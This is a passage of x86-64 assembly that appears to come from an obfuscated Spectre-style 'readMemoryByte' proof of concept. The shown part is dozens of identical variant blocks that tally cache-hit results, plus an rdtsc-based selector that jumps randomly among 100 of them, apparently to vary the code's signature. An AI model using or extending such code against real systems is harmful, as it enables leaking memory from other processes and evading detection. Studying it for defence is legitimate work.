## Variant 37
.LreadMemoryByte_win6_var37:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 38
.LreadMemoryByte_win6_var38:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 39
.LreadMemoryByte_win6_var39:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 40
.LreadMemoryByte_win6_var40:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 41
.LreadMemoryByte_win6_var41:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 42
.LreadMemoryByte_win6_var42:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 43
.LreadMemoryByte_win6_var43:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 44
.LreadMemoryByte_win6_var44:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 45
.LreadMemoryByte_win6_var45:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 46
.LreadMemoryByte_win6_var46:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 47
.LreadMemoryByte_win6_var47:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 48
.LreadMemoryByte_win6_var48:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 49
.LreadMemoryByte_win6_var49:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 50
.LreadMemoryByte_win6_var50:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 51
.LreadMemoryByte_win6_var51:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 52
.LreadMemoryByte_win6_var52:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 53
.LreadMemoryByte_win6_var53:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 54
.LreadMemoryByte_win6_var54:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 55
.LreadMemoryByte_win6_var55:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 56
.LreadMemoryByte_win6_var56:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 57
.LreadMemoryByte_win6_var57:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 58
.LreadMemoryByte_win6_var58:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 59
.LreadMemoryByte_win6_var59:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 60
.LreadMemoryByte_win6_var60:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 61
.LreadMemoryByte_win6_var61:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 62
.LreadMemoryByte_win6_var62:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 63
.LreadMemoryByte_win6_var63:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 64
.LreadMemoryByte_win6_var64:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 65
.LreadMemoryByte_win6_var65:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 66
.LreadMemoryByte_win6_var66:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 67
.LreadMemoryByte_win6_var67:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 68
.LreadMemoryByte_win6_var68:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 69
.LreadMemoryByte_win6_var69:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 70
.LreadMemoryByte_win6_var70:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 71
.LreadMemoryByte_win6_var71:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 72
.LreadMemoryByte_win6_var72:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 73
.LreadMemoryByte_win6_var73:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 74
.LreadMemoryByte_win6_var74:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 75
.LreadMemoryByte_win6_var75:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 76
.LreadMemoryByte_win6_var76:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 77
.LreadMemoryByte_win6_var77:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 78
.LreadMemoryByte_win6_var78:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 79
.LreadMemoryByte_win6_var79:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 80
.LreadMemoryByte_win6_var80:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 81
.LreadMemoryByte_win6_var81:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 82
.LreadMemoryByte_win6_var82:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 83
.LreadMemoryByte_win6_var83:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 84
.LreadMemoryByte_win6_var84:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 85
.LreadMemoryByte_win6_var85:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 86
.LreadMemoryByte_win6_var86:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 87
.LreadMemoryByte_win6_var87:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 88
.LreadMemoryByte_win6_var88:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 89
.LreadMemoryByte_win6_var89:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 90
.LreadMemoryByte_win6_var90:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 91
.LreadMemoryByte_win6_var91:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 92
.LreadMemoryByte_win6_var92:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 93
.LreadMemoryByte_win6_var93:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 94
.LreadMemoryByte_win6_var94:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 95
.LreadMemoryByte_win6_var95:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 96
.LreadMemoryByte_win6_var96:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 97
.LreadMemoryByte_win6_var97:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 98
.LreadMemoryByte_win6_var98:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 99
.LreadMemoryByte_win6_var99:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
.LreadMemoryByte_win6_continue:
	addq	$32, %rsp
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	%ecx, (%rdx,%rax)
.L17:
	addl	$1, -96(%rbp)
.L14:
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win5_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win5_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win5_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win5_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win5_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win5_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win5_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win5_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win5_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win5_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win5_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win5_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win5_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win5_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win5_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win5_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win5_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win5_var17
	cmpl	$18, %eax
	je	.LreadMemoryByte_win5_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win5_var19
	cmpl	$20, %eax
	je	.LreadMemoryByte_win5_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win5_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win5_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win5_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win5_var24
	cmpl	$25, %eax
	je	.LreadMemoryByte_win5_var25
	cmpl	$26, %eax
	je	.LreadMemoryByte_win5_var26
	cmpl	$27, %eax
	je	.LreadMemoryByte_win5_var27
	cmpl	$28, %eax
	je	.LreadMemoryByte_win5_var28
	cmpl	$29, %eax
	je	.LreadMemoryByte_win5_var29
	cmpl	$30, %eax
	je	.LreadMemoryByte_win5_var30
	cmpl	$31, %eax
	je	.LreadMemoryByte_win5_var31
	cmpl	$32, %eax
	je	.LreadMemoryByte_win5_var32
	cmpl	$33, %eax
	je	.LreadMemoryByte_win5_var33
	cmpl	$34, %eax
	je	.LreadMemoryByte_win5_var34
	cmpl	$35, %eax
	je	.LreadMemoryByte_win5_var35
	cmpl	$36, %eax
	je	.LreadMemoryByte_win5_var36
	cmpl	$37, %eax
	je	.LreadMemoryByte_win5_var37
	cmpl	$38, %eax
	je	.LreadMemoryByte_win5_var38
	cmpl	$39, %eax
	je	.LreadMemoryByte_win5_var39
	cmpl	$40, %eax
	je	.LreadMemoryByte_win5_var40
	cmpl	$41, %eax
	je	.LreadMemoryByte_win5_var41
	cmpl	$42, %eax
	je	.LreadMemoryByte_win5_var42
	cmpl	$43, %eax
	je	.LreadMemoryByte_win5_var43
	cmpl	$44, %eax
	je	.LreadMemoryByte_win5_var44
	cmpl	$45, %eax
	je	.LreadMemoryByte_win5_var45
	cmpl	$46, %eax
	je	.LreadMemoryByte_win5_var46
	cmpl	$47, %eax
	je	.LreadMemoryByte_win5_var47
	cmpl	$48, %eax
	je	.LreadMemoryByte_win5_var48
	cmpl	$49, %eax
	je	.LreadMemoryByte_win5_var49
	cmpl	$50, %eax
	je	.LreadMemoryByte_win5_var50
	cmpl	$51, %eax
	je	.LreadMemoryByte_win5_var51
	cmpl	$52, %eax
	je	.LreadMemoryByte_win5_var52
	cmpl	$53, %eax
	je	.LreadMemoryByte_win5_var53
	cmpl	$54, %eax
	je	.LreadMemoryByte_win5_var54
	cmpl	$55, %eax
	je	.LreadMemoryByte_win5_var55
	cmpl	$56, %eax
	je	.LreadMemoryByte_win5_var56
	cmpl	$57, %eax
	je	.LreadMemoryByte_win5_var57
	cmpl	$58, %eax
	je	.LreadMemoryByte_win5_var58
	cmpl	$59, %eax
	je	.LreadMemoryByte_win5_var59
	cmpl	$60, %eax
	je	.LreadMemoryByte_win5_var60
	cmpl	$61, %eax
	je	.LreadMemoryByte_win5_var61
	cmpl	$62, %eax
	je	.LreadMemoryByte_win5_var62
	cmpl	$63, %eax
	je	.LreadMemoryByte_win5_var63
	cmpl	$64, %eax
	je	.LreadMemoryByte_win5_var64
	cmpl	$65, %eax
	je	.LreadMemoryByte_win5_var65
	cmpl	$66, %eax
	je	.LreadMemoryByte_win5_var66
	cmpl	$67, %eax
	je	.LreadMemoryByte_win5_var67
	cmpl	$68, %eax
	je	.LreadMemoryByte_win5_var68
	cmpl	$69, %eax
	je	.LreadMemoryByte_win5_var69
	cmpl	$70, %eax
	je	.LreadMemoryByte_win5_var70
	cmpl	$71, %eax
	je	.LreadMemoryByte_win5_var71
	cmpl	$72, %eax
	je	.LreadMemoryByte_win5_var72
	cmpl	$73, %eax
	je	.LreadMemoryByte_win5_var73
	cmpl	$74, %eax
	je	.LreadMemoryByte_win5_var74
	cmpl	$75, %eax
	je	.LreadMemoryByte_win5_var75
	cmpl	$76, %eax
	je	.LreadMemoryByte_win5_var76
	cmpl	$77, %eax
	je	.LreadMemoryByte_win5_var77
	cmpl	$78, %eax
	je	.LreadMemoryByte_win5_var78
	cmpl	$79, %eax
	je	.LreadMemoryByte_win5_var79
	cmpl	$80, %eax
	je	.LreadMemoryByte_win5_var80
	cmpl	$81, %eax
	je	.LreadMemoryByte_win5_var81
	cmpl	$82, %eax
	je	.LreadMemoryByte_win5_var82
	cmpl	$83, %eax
	je	.LreadMemoryByte_win5_var83
	cmpl	$84, %eax
	je	.LreadMemoryByte_win5_var84
	cmpl	$85, %eax
	je	.LreadMemoryByte_win5_var85
	cmpl	$86, %eax
	je	.LreadMemoryByte_win5_var86
	cmpl	$87, %eax
	je	.LreadMemoryByte_win5_var87
	cmpl	$88, %eax
	je	.LreadMemoryByte_win5_var88
	cmpl	$89, %eax
	je	.LreadMemoryByte_win5_var89
	cmpl	$90, %eax
	je	.LreadMemoryByte_win5_var90
	cmpl	$91, %eax
	je	.LreadMemoryByte_win5_var91
	cmpl	$92, %eax
	je	.LreadMemoryByte_win5_var92
	cmpl	$93, %eax
	je	.LreadMemoryByte_win5_var93
	cmpl	$94, %eax
	je	.LreadMemoryByte_win5_var94
	cmpl	$95, %eax
	je	.LreadMemoryByte_win5_var95
	cmpl	$96, %eax
	je	.LreadMemoryByte_win5_var96
	cmpl	$97, %eax
	je	.LreadMemoryByte_win5_var97
	cmpl	$98, %eax
	je	.LreadMemoryByte_win5_var98
	cmpl	$99, %eax
	je	.LreadMemoryByte_win5_var99
